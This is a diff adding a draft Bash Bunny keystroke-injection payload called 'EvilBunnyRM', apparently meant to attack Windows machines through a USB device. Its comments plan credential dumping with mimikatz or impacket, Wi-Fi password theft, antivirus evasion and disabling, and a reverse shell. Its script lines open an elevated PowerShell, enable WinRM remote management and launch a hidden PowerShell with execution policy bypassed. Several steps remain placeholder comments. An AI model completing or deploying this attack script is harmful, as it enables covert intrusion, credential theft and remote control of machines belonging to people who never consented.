@@ -1,0 +1,42 @@
+# Title:         EvilBunnyRM
+# Author:        Chandler Rose
+# Version:       1.0
+# Firmware:      >= 1.7
+
+# Script will enable winrm
+# script will dump creds. Perhaps with impacket or mimikatz. Geti the wifi password(this may be useful).
+# Different version of the script for Windows 10. Less security defaults in place than WIndows 11. 
+
+# script will cleanup after itself
+ 
+# Setup The Attack
+# 1. Create the payload.
+# 2. Obfuscate the payload to avoid AV.
+# 3. Setup listener locally or remotely.
+# 3. Plug in the bunny and run the attack against the target.
+
+# Enable Attack Mode
+LED SETUP
+ATTACKMODE HID 
+
+# Mapping out the script
+
+# Open Powershell as admin 
+WIN + R 
+type powershell
+Press CTRL SHIFT ENTER
+
+# Enable WinRM
+Type winrm quickconfig 
+Type y
+Type y
+
+# Disable AV Protection
+
+# Download or use local Impacket/mimikatz
+# dump creds 
+
+# Open powershell and download/execute the reverse shell .bat file. 
+LED ATTACK
+RUN WIN Powershell -nop -ex Bypass -w Hidden ""
+LED FINISH
